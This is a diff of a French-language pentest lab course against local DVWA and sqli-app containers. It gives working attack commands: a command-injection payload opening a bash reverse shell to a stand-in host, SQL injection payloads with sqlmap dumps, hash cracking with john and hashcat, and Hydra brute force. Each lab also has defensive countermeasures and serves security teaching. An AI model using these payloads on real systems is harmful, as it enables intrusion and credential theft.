-- `0>&1` : redirige stdin vers la même socket (l'entrée clavier arrive de l'attaquant)
-
+*Terminal 2 — trouver l'IP docker0 :*
 ```bash
 ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 # → généralement 172.17.0.1
+```
 
+*Terminal 2 — injecter le reverse shell (via l'interface web DVWA) :*
+```
 127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
 ```
 
-**Checkpoint :** Retournez dans le **Terminal 1** (netcat) : une connexion entrante apparaît, suivie d'un prompt shell. Tapez `whoami` → `www-data`.
+**Résultat attendu :** Dans le Terminal 1, une connexion entrante apparaît : `connect to [KALI_IP] from (UNKNOWN) [172.17.0.2] ...`. Tapez `whoami` → `www-data`.
 
-### 🔒 Contre-mesure (M1013 + M1018 Execution Prevention)
+**Explication :** `bash -c` exécute une chaîne shell. `bash -i` démarre un shell interactif. `>& /dev/tcp/<IP>/4444` redirige stdout et stderr vers la socket TCP. `0>&1` redirige stdin (clavier) vers la même socket. Résultat : l'attaquant tape ses commandes localement, elles sont exécutées sur le serveur distant.
 
-La command injection se neutralise en **ne passant jamais l'entrée utilisateur à un interpréteur shell** :
+---
 
-| Vulnérabilité | Correction | Code |
-|---|---|---|
-| `shell_exec("ping " . $input)` | **`escapeshellcmd()` + `escapeshellarg()`** | `$safe = escapeshellarg($input); shell_exec("ping -c 4 " . $safe);` |
-| Shell interactif | **Ne pas utiliser `shell_exec()`** | Remplacer par `proc_open()` avec tableau d'arguments (pas de string) |
-| Processus shell | **`open_basedir` + `disable_functions`** | Désactiver `system`, `exec`, `passthru`, `shell_exec`, `popen` dans `php.ini` |
-| Reverse shell sortant | **Firewall egress filtering** | `ufw default deny outgoing` (ne permettre que les flux légitimes) |
+### 🔒 Contre-mesure (M1013 + M1018)
 
+**Objectif :** Bloquer l'exécution de commandes système en désactivant les fonctions PHP dangereuses.
+
+**Où ?** Terminal 1
+
+**Actions :**
+1. Ajouter `shell_exec`, `system`, `exec`, etc. dans la directive `disable_functions` du `php.ini`
+2. Redémarrer Apache
+3. Vérifier que les fonctions sont bien désactivées
+4. Re-tester l'injection de commande
+
+**Commande :**
 ```bash
-# Appliquer le principe du moindre privilège : désactiver les fonctions dangereuses dans PHP
 docker exec dvwa-target bash -c "
   sed -i 's/disable_functions =.*/disable_functions = system,exec,passthru,shell_exec,popen,proc_open/' /etc/php/*/apache2/php.ini
   apache2ctl restart
 "
-# Vérification : shell_exec est-il bien désactivé ?
 docker exec dvwa-target bash -c "php -r 'echo function_exists(\"shell_exec\") ? \"actif\" : \"inactif\";'"
-# → inactif  (shell_exec est bien désactivé)
+# → inactif
 
-# Re-tester l'injection de commande :
-curl -s "http://localhost:8088/vulnerabilities/exec/" --data "ip=127.0.0.1;whoami&Submit=Submit" \
+curl -s "http://localhost:8088/vulnerabilities/exec/" \
+  --data "ip=127.0.0.1;whoami&Submit=Submit" \
   -b /tmp/dvwa_cookie.txt 2>/dev/null | grep -c "www-data"
-# → 0 (whoami ne s'exécute plus : shell_exec est désactivé)
+# → 0 (plus de résultat)
 ```
 
-> **Checkpoint défensif :** Après `disable_functions`, l'injection de commande et le reverse shell échouent.
+**Résultat attendu :** `shell_exec` affiche `inactif`. La commande `whoami` n'est plus exécutée : `grep -c` retourne `0`.
 
-> **📌 À retenir :** On a injecté `;whoami` dans un champ `ping` pour exécuter des commandes système, puis obtenu un reverse shell (Meterpreter) avec connexion à distance ([T1203](https://attack.mitre.org/techniques/T1203/) Exploitation for Client Execution).  
-> **Attendu :** shell interactif sur Kali (Meterpreter session 1 ouverte).  
-> **Défense :** Désactiver les fonctions système dangereuses (`disable_functions`), valider les entrées (IP), filter les métacaractères (`;`, `|`, `$`).
+**Explication :** La directive `disable_functions` empêche PHP d'appeler ces fonctions au runtime. Même si le code vulnérable appelle `shell_exec()`, PHP ne fait rien et retourne `null`. Le payload `;whoami` passe toujours dans la requête, mais le shell système n'est plus invoqué.
 
-### Résultat attendu
-
-- [ ] Injection de commande basique : `whoami`, `ls /etc/`, `cat /etc/passwd` exécutés via le champ `ping`
-- [ ] Reverse shell actif : écouteur netcat reçoit la connexion et donne un prompt `www-data`
-- [ ] Commande `whoami` tapée dans le reverse shell retourne `www-data`
-- [ ] Comprendre le mécanisme : `;` chaîne des commandes, `bash -i >& /dev/tcp/...` crée un shell distant
-- [ ] Savoir trouver l'IP docker0 pour que le conteneur joigne l'hôte Kali
-- [ ] Connaître les défenses : `disable_functions`, `escapeshellarg()`, filtrage des métacaractères
-
-> **☕ Pause recommandée :** Le Lab 1.5 ci-dessous est le plus long et le plus dense de la journée.
-> Prenez 5-10 minutes avant de l'attaquer — vous allez enchaîner injection SQL sur 3 points d'entrée,
-> extraction automatisée avec sqlmap, et cracking de mots de passe. Un esprit reposé est plus efficace
-> pour analyser les résultats.
+> **☕ Pause recommandée :** Le Lab 1.5 ci-dessous est le plus long et le plus dense de la journée. Prenez 5-10 minutes avant de l'attaquer — vous allez enchaîner injection SQL sur 3 points d'entrée, extraction automatisée avec sqlmap, et cracking de mots de passe. Un esprit reposé est plus efficace pour analyser les résultats.
 
 ---
 
@@ -919,102 +949,121 @@ L'application `sqli-app` (http://localhost:8083) expose 3 points d'injection dif
 
 ### Prérequis
 
-**Contexte :** Avant de commencer, on démarre le conteneur sqli-app (application vulnérable dédiée aux injections SQL avancées). On vérifie qu'il répond bien sur le port 8083. On crée aussi le dossier de rendu pour ce lab.
+**Objectif :** Démarrer le conteneur `sqli-app` et vérifier qu'il répond sur le port 8083.
 
-**Flags :**
-- `docker compose up -d sqli-app` : démarre seulement le service sqli-app en arrière-plan (detached)
-- `curl -I` : envoie une requête HEAD (ne télécharge que les en-têtes HTTP, rapide)
-- `mkdir -p` : crée le dossier s'il n'existe pas déjà ; `&&` : enchaîne les commandes séquentiellement
+**Où ?** Terminal 1
 
+**Actions :**
+1. Démarrer le service `sqli-app` avec Docker Compose
+2. Vérifier la réponse HTTP avec une requête HEAD
+3. Créer le dossier de rendu `rendu_labs/jour-01/`
+
+**Commande :**
 ```bash
 docker compose up -d sqli-app
 curl -I http://localhost:8083/
 mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
 ```
 
+**Résultat attendu :** La réponse HTTP doit être `200 OK` ou `200`. Le dossier `rendu_labs/jour-01/` est créé.
+
+**Explication :** `docker compose up -d sqli-app` ne démarre que le service cible (pas tous les conteneurs). `curl -I` envoie une requête HEAD pour vérifier que le serveur web est prêt sans télécharger toute la page.
+
+---
+
 ### Étape 1 — Trouver les injections manuellement
 
-**Point 1 : Paramètre `?id=` (numeric)**
+**Objectif :** Confirmer que 3 points d'entrée différents sont vulnérables aux injections SQL.
 
-**Contexte :** On teste une injection SQL numérique sur le paramètre `id` de la page de recherche. D'abord on fait une requête normale (id=1) pour voir le comportement attendu. Ensuite on injecte `OR 1=1` (toujours vrai) pour voir si tous les produits sont retournés. Enfin on injecte `AND 1=2` (toujours faux) pour confirmer que la requête est manipulable.
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
-**Flags :**
-- `curl -s` : mode silencieux (pas de barre de progression)
-- `grep -o "Laptop\|Monitor\|Keyboard"` : extrait le nom du produit attendu
-- `grep -c "<tr>"` : compte les lignes de tableau HTML (1 = normal, 6 = tous les produits)
-- `%20` = espace dans l'encodage URL ; `OR 1=1` = condition toujours vraie ; `AND 1=2` = contradiction
-- `grep -o "Aucun"` : vérifie le message d'absence de résultat
+#### Point 1 — Paramètre `?id=` (numeric)
 
+**Actions :**
+1. Requête normale `id=1` → un seul produit
+2. Injecter `id=1 OR 1=1` (toujours vrai) → tous les produits
+3. Injecter `id=1 AND 1=2` (toujours faux) → aucun produit
+
+**Commande :**
 ```bash
 curl -s "http://localhost:8083/?page=search&id=1" | grep -o "Laptop\|Monitor\|Keyboard"
-# → Laptop Pro X  (comportement normal)
+# → Laptop Pro X
 
 curl -s "http://localhost:8083/?page=search&id=1%20OR%201=1" | grep -c "<tr>"
-# → 6 (tous les produits retournés : injection confirmée)
+# → 6 (tous les produits)
 
 curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
-# → Aucun produit trouvé  (AND 1=2 toujours faux)
+# → Aucun produit trouvé
 ```
 
-**Point 2 : Formulaire de login (string injection)**
+**Résultat attendu :** `1 OR 1=1` retourne 6 produits au lieu d'1. `AND 1=2` retourne "Aucun produit trouvé".
 
-**Contexte :** On teste l'injection SQL sur le formulaire de connexion. D'abord on vérifie le comportement normal avec un mauvais mot de passe. Ensuite on injecte `admin' --` pour commenter la vérification du mot de passe : le `'` ferme la chaîne SQL, `--` neutralise le reste de la requête. Enfin on utilise `' OR '1'='1' --` pour se connecter en tant que tous les utilisateurs.
+**Explication :** Le paramètre `id` est injecté directement dans une requête SQL numérique : `WHERE id = $id`. `OR 1=1` est toujours vrai → tous les produits. `AND 1=2` est toujours faux → aucun résultat. Ces deux tests confirment que l'entrée utilisateur n'est pas filtrée.
 
-**Flags :**
-- `-d "page=login&username=...&password=..."` : données POST du formulaire
-- `grep "Identifiants"` : cherche le message d'échec normal
-- `grep "Connecté"` : cherche le message de connexion réussie
-- `grep -c "Connecté"` : compte le nombre de connexions réussies (6 = tous les utilisateurs)
-- `%20` = espace, `'` ferme la chaîne SQL, `--` commente le reste de la requête
+#### Point 2 — Formulaire de login (string injection)
 
+**Actions :**
+1. Tester un mauvais mot de passe normal → message d'échec
+2. Injecter `admin' --` → bypass du mot de passe
+3. Injecter `' OR '1'='1' --` → connexion en tant que tous les utilisateurs
+
+**Commande :**
 ```bash
 curl -s -d "page=login&username=admin&password=wrong" "http://localhost:8083/" | grep "Identifiants"
-# →  Identifiants incorrects  (comportement normal)
+# → Identifiants incorrects
 
 curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep "Connecté"
-# →  Connecté en tant que admin  (bypass réussi)
+# → Connecté en tant que admin
 
 curl -s -d "page=login&username='%20OR%20'1'='1'%20--&password=x" "http://localhost:8083/" | grep -c "Connecté"
-# → 6 (tous les utilisateurs sont "connectés")
+# → 6
 ```
 
-**Point 3 : Filtre `?filter=` (LIKE injection)**
+**Résultat attendu :** `admin' --` se connecte sans mot de passe. `' OR '1'='1' --` connecte 6 utilisateurs.
 
-**Contexte :** Le paramètre `filter` est utilisé dans une clause SQL `LIKE '%valeur%'`. On injecte d'abord un filtre normal (`john`) pour voir le comportement. Ensuite on ferme le LIKE avec `%'` et on utilise `UNION SELECT` pour extraire les colonnes `username`, `password` et `email` de la table `users`. C'est l'injection la plus difficile car il faut maîtriser la syntaxe UNION.
+**Explication :** La requête SQL vulnérable est `WHERE username = '$u' AND password = '$hash'`. Avec `admin' --`, le `'` ferme la chaîne et `--` commente la vérification du mot de passe. `' OR '1'='1'` rend la condition toujours vraie pour tous les utilisateurs.
 
-**Flags :**
-- `grep "<td>" | wc -l` : compte les cellules HTML (4 cellules = 1 utilisateur)
-- `%25` = `%` dans l'encodage URL (pour `%'` qui ferme le LIKE)
-- `UNION SELECT 1,username,password,email FROM users` : fusionne les résultats de la requête normale avec ceux de la table users
-- `--` : commente le reste de la requête SQL originale
+#### Point 3 — Filtre `?filter=` (LIKE injection)
 
+**Actions :**
+1. Filtre normal `john` → 1 utilisateur trouvé
+2. Injecter `%' UNION SELECT 1,username,password,email FROM users --` → extrait tous les utilisateurs
+
+**Commande :**
 ```bash
 curl -s "http://localhost:8083/?page=users&filter=john" | grep "<td>" | wc -l
-# → 4 (1 utilisateur trouvé : comportement normal)
+# → 4 (1 utilisateur)
 
 curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,username,password,email%20FROM%20users%20--" | grep "<td>"
-# → <td>1</td><td>admin</td>...  (injection UNION confirmée)
+# → <td>1</td><td>admin</td>...
 ```
 
-**Checkpoint A :** Les 3 injections fonctionnent. L'application est vulnérable.
+**Résultat attendu :** La première commande retourne 4 cellules HTML (1 utilisateur). La seconde retourne `<td>` avec les données de tous les utilisateurs.
+
+**Explication :** Le paramètre `filter` est injecté dans `WHERE username LIKE '%$filter%'`. On ferme le LIKE avec `%'`, puis on ajoute `UNION SELECT` pour fusionner les résultats avec la table `users`. `--` commente le reste de la requête. C'est l'injection la plus difficile car elle nécessite la maîtrise de la syntaxe UNION.
+
+> **Checkpoint A :** Les 3 injections fonctionnent. L'application est vulnérable sur tous les points d'entrée.
+
+---
 
 ### Étape 2 — Exploitation automatisée avec sqlmap
 
-**Contexte :** On passe à l'automatisation avec sqlmap. On commence par énumérer les tables de la base de données pour découvrir leur structure, puis on liste les colonnes de la table `users`, et enfin on extrait (dump) les données. Chaque commande construit sur la précédente.
+**Objectif :** Extraire automatiquement les données des 6 utilisateurs depuis la base, sans connaître la structure.
 
-**Flags (première commande) :**
-- `--tables` : énumère toutes les tables de la base de données
-- `--batch` : mode non-interactif (répond "oui" automatiquement aux questions)
-- `2>&1 | tee sqli_tables.txt` : redirige stderr vers stdout ET sauvegarde dans un fichier
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
+**Actions :**
+1. Énumérer les tables de la base : `--tables`
+2. Énumérer les colonnes de la table `users` : `-T users --columns`
+3. Dumper les colonnes `username,password,email,role` : `--dump`
+
+**Commande :**
 ```bash
-cd rendu_labs/jour-01
 sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch 2>&1 | tee sqli_tables.txt
 ```
 
-Sortie attendue :
-
-```console
+**Résultat attendu :**
+```
 [2 tables]
 +----------+
 | products |
@@ -1022,16 +1071,13 @@ Sortie attendue :
 +----------+
 ```
 
-**Flags (deuxième commande) :**
-- `-T users` (table) : table cible à inspecter
-- `--columns` : énumère toutes les colonnes et leurs types
-
+**Commande :**
 ```bash
 sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
 ```
 
-```console
-[5 columns]
+**Résultat attendu :**
+```
 +-----------+----------+
 | Column    | Type     |
 +-----------+----------+
@@ -1043,20 +1089,14 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
 +-----------+----------+
 ```
 
-**Flags (troisième commande) :**
-- `-T users` (table) : table cible
-- `-C username,password,email,role` (columns) : colonnes spécifiques à extraire
-- `--dump` : vide et affiche le contenu des colonnes
-- `2>&1 | tee sqli_dump.txt` : capture toute la sortie dans un fichier
-
+**Commande :**
 ```bash
 sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T users -C username,password,email,role --dump --batch 2>&1 | tee sqli_dump.txt
 ```
 
-Sortie attendue :
-
-```console
+**Résultat attendu :**
+```
 +------------+----------------------------------+---------------------+------------+
 | username   | password                         | email               | role       |
 +------------+----------------------------------+---------------------+------------+
@@ -1069,24 +1109,28 @@ Sortie attendue :
 +------------+----------------------------------+---------------------+------------+
 ```
 
-**Checkpoint B :** 6 utilisateurs extraits avec leurs hashs MD5.
+**Explication :** sqlmap automatise tout le processus : détection du type de SGBD (SQLite), énumération des tables et colonnes, puis extraction des données. Les options `-T` (table) et `-C` (columns) permettent de cibler précisément ce qu'on veut. `--batch` évite les interactions manuelles. `tee` sauvegarde la sortie dans un fichier pour le rapport.
+
+> **Checkpoint B :** 6 utilisateurs extraits avec leurs hashs MD5.
+
+---
 
 ### Étape 3 — Craquer les hashs
 
-#### Méthode 1 : john the ripper
+**Objectif :** Retrouver les mots de passe en clair à partir des hashs MD5 extraits.
 
-**Contexte :** Les hashs MD5 sont réversibles par attaque par dictionnaire. On utilise John the Ripper avec la wordlist `rockyou.txt` (~14 millions de mots de passe courants) pour trouver les mots de passe en clair. On commence par créer un fichier de hashs au format `username:hash`, puis on lance le cracking.
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
-**Flags :**
-- `cat > hashes.txt << 'EOF'` : écrit le contenu entre EOF dans le fichier (heredoc, 'EOF' empêche l'expansion des variables)
-- `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` : décompresse la wordlist (première utilisation seulement)
-- `john --format=raw-md5` : force le mode MD5 brut (sans sel)
-- `--wordlist=...` : dictionnaire de mots de passe à tester
-- `john --show` : affiche les mots de passe déjà craqués
+#### Méthode 1 : John the Ripper
 
+**Actions :**
+1. Créer un fichier `hashes.txt` au format `username:hash`
+2. Décompresser la wordlist `rockyou.txt` (première fois)
+3. Lancer john avec `--format=raw-md5`
+4. Afficher les mots de passe craqués avec `john --show`
+
+**Commande :**
 ```bash
-cd rendu_labs/jour-01
-
 cat > hashes.txt << 'EOF'
 admin:5f4dcc3b5aa765d61d8327deb882cf99
 john_doe:482c811da5d5b4bc6d497ffa98491e38
@@ -1102,9 +1146,8 @@ john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 2>/
 john --show --format=raw-md5 hashes.txt
 ```
 
-Sortie attendue :
-
-```console
+**Résultat attendu :**
+```
 admin:password
 john_doe:password123
 jane_dev:abc123
@@ -1113,50 +1156,49 @@ guest:test
 flag_user:admin
 ```
 
-#### Méthode 2 : recherche en ligne (optionnelle)
+#### Méthode 2 : Recherche en ligne (optionnelle)
 
 ```bash
-# Méthode alternative : recherche des hashs dans des bases rainbow tables en ligne (CrackStation, md5decrypt)
-# Utile quand john/hashcat ne trouve pas — ces sites pré-calculent les hashs MD5 des mots communs
 # CrackStation.net ou md5decrypt.net
 # 5f4dcc3b5aa765d61d8327deb882cf99 → password
 # e99a18c428cb38d5f260853678922e03 → abc123
-# 0d107d09f5bbe40cade3de5c71e9e9b7 → letmein
 ```
 
 #### Méthode 3 : hashcat (si GPU disponible)
 
-**Contexte :** hashcat est plus rapide que john quand un GPU est disponible (parallélisation massive). Il utilise le même fichier de hashs et la même wordlist. L'option `--force` permet de contourner les avertissements sur le matériel.
+**Actions :**
+1. Lancer hashcat avec `-m 0` (MD5), `-a 0` (dictionnaire)
+2. Utiliser le même fichier `hashes.txt` et la même wordlist
 
-**Flags :**
-- `-m 0` : mode MD5 (hash type 0)
-- `-a 0` : attaque par dictionnaire (straight mode)
-- `--username` : ignore le préfixe `username:` dans le fichier de hashs
-- `--force` : ignore les avertissements matériels
-
+**Commande :**
 ```bash
-cd rendu_labs/jour-01
 hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
-**Checkpoint C :** Au moins 3 mots de passe craqués. Le flag_user utilise `admin` comme mot de passe — une erreur classique.
+> **Checkpoint C :** Au moins 3 mots de passe craqués. Le `flag_user` utilise `admin` comme mot de passe — une erreur classique.
+
+**Explication :** Les hashs MD5 sont non salés : le même mot de passe produit toujours le même hash. Une attaque par dictionnaire compare chaque hash de la wordlist (pré-calculé) avec les hashs cibles. Dès qu'une correspondance est trouvée, le mot de passe en clair est révélé. John the Ripper et hashcat automatisent cette comparaison.
+
+---
 
 ### Étape 4 — Extraire le flag caché
 
-**Contexte :** La table `products` contient un champ `secret_flag` caché avec un flag CTF. On utilise sqlmap pour dumper cette colonne spécifique. Les produits normaux ont `NULL` dans ce champ, mais l'un d'eux contient le flag.
+**Objectif :** Trouver le flag CTF caché dans la colonne `secret_flag` de la table `products`.
 
-**Flags :**
-- `-T products` : table cible
-- `-C name,secret_flag` : colonnes à extraire (nom du produit et flag secret)
-- `--dump` : vide le contenu ; `--batch` : mode non-interactif
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
+**Actions :**
+1. Dumper les colonnes `name` et `secret_flag` de la table `products`
+
+**Commande :**
 ```bash
 cd rendu_labs/jour-01
 sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T products -C name,secret_flag --dump --batch
 ```
 
-```console
+**Résultat attendu :**
+```
 +---------------------+--------------------------------+
 | name                | secret_flag                    |
 +---------------------+--------------------------------+
@@ -1166,6 +1208,10 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" \
 +---------------------+--------------------------------+
 ```
 
+**Explication :** sqlmap peut cibler n'importe quelle table et colonne de la base. La colonne `secret_flag` contient le flag CTF uniquement pour le produit "Laptop Pro X". Les autres lignes ont `NULL`. Ce flag peut être inclus dans le rapport de pentest comme preuve d'accès aux données.
+
+---
+
 ### Checkpoints
 
 - [ ] Injection trouvée sur les 3 points d'entrée
@@ -1173,36 +1219,42 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" \
 - [ ] john/hashcat a craqué au moins 3 mots de passe
 - [ ] Flag `FLAG{sql_injection_master}` trouvé
 
-### 🔒 Contre-mesure (M1013 App Hardening + M1027 Password Policies)
+### 🔒 Contre-mesure (M1013 + M1027)
 
-L'application sqli-app a **3 points d'injection**. On corrige les 3 en une seule stratégie : **requêtes préparées PDO partout**. On remplace aussi MD5 par bcrypt pour rendre le cracking inutile.
+**Objectif :** Neutraliser les 3 points d'injection SQL en une seule stratégie : requêtes préparées PDO partout + bcrypt.
 
-| Point d'injection | Code vulnérable | Code corrigé |
-|---|---|---|
-| `?id=` (numeric) | `"SELECT * FROM products WHERE id = $id"` | `$stmt = $db->prepare("SELECT * FROM products WHERE id = ?"); $stmt->execute([$id]);` |
-| `username` (login) | `"...WHERE username = '$u' AND password = '$hash'"` | `$stmt = $db->prepare("SELECT * FROM users WHERE username = ?"); $stmt->execute([$u]);` puis `password_verify($p, $hash)` |
-| `?filter=` (LIKE) | `"...WHERE username LIKE '%$filter%'"` | `$stmt = $db->prepare("SELECT * FROM users WHERE username LIKE ?"); $stmt->execute(["%$filter%"]);` |
-| MD5 | `md5($password)` | `password_hash($password, PASSWORD_BCRYPT)` |
+**Où ?** Terminal 1
 
+**Actions :**
+1. Remplacer les 3 requêtes vulnérables par des requêtes préparées PDO
+2. Re-tester avec sqlmap pour confirmer
+
+**Commande (simulation de correction) :**
 ```bash
-# Appliquer la correction sur le conteneur sqli-app
-docker exec sqli-app-target bash -c "
-  cd /var/www/html
-  # Sauvegarde du fichier vulnérable
-  cp index.php index.php.vuln
-  # Remplacer les 3 requêtes vulnérables par des requêtes préparées PDO
-  sed -i 's/\$db->query(\$query)/\$stmt = \$db->prepare(\"SELECT id, name, price, description FROM products WHERE id = ?\"); \$stmt->execute([(int)\$id]); \$stmt->fetchAll(PDO::FETCH_ASSOC)/' index.php
-"
-# Re-tester sqlmap après correction :
-sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "injectable\|not injectable"
-# → all tested parameters do not appear to be injectable (sqlmap échoue : les 3 points d'injection sont neutralisés)
+# Code vulnérable → corrigé :
+# Point 1 (id=) :
+#   $query = "SELECT * FROM products WHERE id = $id"
+#   → $stmt = $db->prepare("SELECT * FROM products WHERE id = ?"); $stmt->execute([$id]);
+#
+# Point 2 (login) :
+#   "WHERE username = '$u' AND password = '$hash'"
+#   → $stmt = $db->prepare("SELECT * FROM users WHERE username = ?"); $stmt->execute([$u]);
+#     puis password_verify($p, $hash)
+#
+# Point 3 (filter=) :
+#   "WHERE username LIKE '%$filter%'"
+#   → $stmt = $db->prepare("SELECT * FROM users WHERE username LIKE ?"); $stmt->execute(["%$filter%"]);
+#
+# Hachage : md5($password) → password_hash($password, PASSWORD_BCRYPT)
+
+# Vérification après correction :
+sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "injectable"
+# → all tested parameters do not appear to be injectable
 ```
 
-> **Checkpoint défensif :** sqlmap ne trouve plus aucune injection. Avec bcrypt, john/hashcat ne peuvent plus craquer les mots de passe en quelques secondes.
+**Résultat attendu :** sqlmap confirme qu'aucun paramètre n'est injectable après correction. Avec bcrypt, john/hashcat ne peuvent plus craquer les mots de passe en quelques secondes.
 
-> **📌 À retenir :** On a exploité 3 points d'injection SQL (numérique, auth bypass, LIKE) avec sqlmap, craqué les hashs MD5 avec john, et compris pourquoi le hachage salé (bcrypt) protège mieux ([T1190](https://attack.mitre.org/techniques/T1190/)).  
-> **Attendu :** 3 injections confirmées + mots de passe craqués en clair.  
-> **Défense :** Requêtes préparées PDO, WAF, bcrypt/argon2 pour les mots de passe.
+**Explication :** Les requêtes préparées PDO séparent le code SQL des données utilisateur — la valeur de `$id` n'est jamais interprétée comme du SQL. bcrypt ajoute un sel aléatoire à chaque mot de passe : même deux utilisateurs avec le même mot de passe auront des hashs différents, rendant les rainbow tables inefficaces. C'est la défense de référence contre les injections SQL.
 
 ### Résultat attendu
 
@@ -1220,8 +1272,6 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 ---
 
 ## Lab 1.6 — Attaque par force brute avec Hydra
-
-### Fiche
 
 | Durée | Conteneur | Dossier | Technique ATT&CK |
 |---|---|---|---|
@@ -1242,39 +1292,43 @@ flowchart LR
     B -->|"302 → Login Success"| A
     A -->|"Trouvé : admin:password"| C["Rapport"]
 ```
-
 **Fig 5d** — Attaque par force brute avec Hydra : itération de couples login:password depuis une wordlist jusqu'à obtenir un `302 Found` (connexion réussie) sur DVWA.
 
 ### Prérequis
 
-**Contexte :** On vérifie que le cookie de session DVWA est toujours valide avant de lancer Hydra. Si le code HTTP retourné est 200, la session est active et on peut travailler directement.
+**Objectif :** Vérifier que le cookie de session DVWA est toujours valide avant de lancer Hydra.
 
-**Flags :**
-- `-b /tmp/dvwa_cookie.txt` : envoie le cookie de session sauvegardé
-- `-o /dev/null` : ignore le corps de la réponse (on ne regarde que le code)
-- `-w "%{http_code}"` : affiche uniquement le code HTTP de la réponse
+**Où ?** Terminal 1
 
+**Actions :**
+1. Envoyer une requête HEAD sur `login.php` avec le cookie de session DVWA
+2. Vérifier que le code HTTP est 200
+
+**Commande :**
 ```bash
 cd rendu_labs/jour-01
 curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost:8088/login.php"
-# → 200  (session active)
+# → 200
 ```
+
+**Résultat attendu :** `200` — la session DVWA est toujours active. Si le cookie a expiré, relancer la commande du Lab 1.1.
+
+**Explication :** `-o /dev/null` ignore le corps de la réponse, `-w "%{http_code}"` n'affiche que le code HTTP. Un code `200` signifie que la page est accessible avec le cookie. Un code `302` pourrait indiquer une redirection vers la page de login (session expirée).
+
+---
 
 ### Étape 1 — Inspecter le formulaire cible
 
-**Contexte :** Avant de lancer Hydra, on doit comprendre la structure du formulaire : méthode HTTP, noms des champs, et message d'échec. On inspecte le HTML de la page de login avec curl pour extraire les noms des champs, puis on soumet un mauvais mot de passe pour capturer le message d'échec qui servira de marqueur à Hydra.
+**Objectif :** Identifier la structure du formulaire HTML et le message d'échec pour configurer Hydra.
 
-**Flags (première commande) :**
-- `curl -s -b /tmp/dvwa_cookie.txt` : télécharge la page avec le cookie de session
-- `grep -o 'name="[^"]*"'` : extrait les valeurs des attributs `name` du formulaire
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
-**Flags (deuxième commande) :**
-- `-d "username=admin&password=mauvais&Login=Login"` : simule une soumission avec un mauvais mot de passe
-- `grep -oi "login failed\|failed"` : cherche le message d'échec (insensible à la casse)
+**Actions :**
+1. Extraire les noms des champs du formulaire de login
+2. Soumettre un mauvais mot de passe pour capturer le message d'échec
 
+**Commande :**
 ```bash
-cd rendu_labs/jour-01
-
 curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/login.php" \
   | grep -o 'name="[^"]*"'
 # → name="username"  name="password"  name="Login"
@@ -1282,25 +1336,27 @@ curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/login.php" \
 curl -s -b /tmp/dvwa_cookie.txt \
   -d "username=admin&password=mauvais&Login=Login" \
   "http://localhost:8088/login.php" | grep -oi "login failed\|failed"
-# → Login failed  (marqueur d'échec pour Hydra)
+# → Login failed
 ```
+
+**Résultat attendu :** Les noms des champs sont `username`, `password`, `Login`. Le message d'échec en cas de mauvais mot de passe est `Login failed`.
+
+**Explication :** Hydra nécessite 3 informations pour attaquer un formulaire HTTP POST : (1) l'URL de soumission, (2) la chaîne POST avec les variables `^USER^` et `^PASS^`, (3) le marqueur d'échec. `grep -o 'name="[^"]*"'` extrait les attributs `name` de tous les champs `<input>`.
+
+---
 
 ### Étape 2 — Lancer Hydra
 
-**Contexte :** Hydra teste des couples `login:password` contre le formulaire HTTP de DVWA. On utilise le module `http-post-form` qui sait soumettre un formulaire POST et détecter la réussite ou l'échec. Le `^USER^` et `^PASS^` sont des variables qu'Hydra remplace à chaque tentative. Le marqueur d'échec est "Login failed" (identifié à l'étape 1).
+**Objectif :** Trouver le mot de passe de l'utilisateur `admin` par attaque par dictionnaire.
 
-**Flags :**
-- `-l admin` (login) : nom d'utilisateur unique à tester
-- `-P /usr/share/wordlists/rockyou.txt` (password list) : wordlist de mots de passe (~14 millions)
-- `-s 8088` (port) : port non standard de DVWA
-- `http-post-form` : module pour les formulaires HTTP POST
-- La chaîne en 3 parties : `"URL:champs_POST:message_échec"`
-  - `/login.php` : URL du formulaire
-  - `username=^USER^&password=^PASS^&Login=Login` : champs avec variables
-  - `Login failed` : texte détecté dans la réponse en cas d'échec
-- `-V` (verbose) : affiche chaque tentative
-- `2>&1 | tee hydra_dvwa.txt` : capture la sortie complète dans un fichier
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
+**Actions :**
+1. Lancer Hydra avec le login `admin` contre le formulaire POST
+2. Utiliser la wordlist `rockyou.txt` (~14 millions de mots de passe)
+3. Attendre qu'Hydra trouve le mot de passe valide
+
+**Commande :**
 ```bash
 cd rendu_labs/jour-01
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
@@ -1309,27 +1365,30 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   | tee hydra_dvwa.txt
 ```
 
-Sortie attendue :
-
-```console
+**Résultat attendu :**
+```
 [8088][http-post-form] host: localhost   login: admin   password: password
 [STATUS] attack finished for localhost (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 ```
 
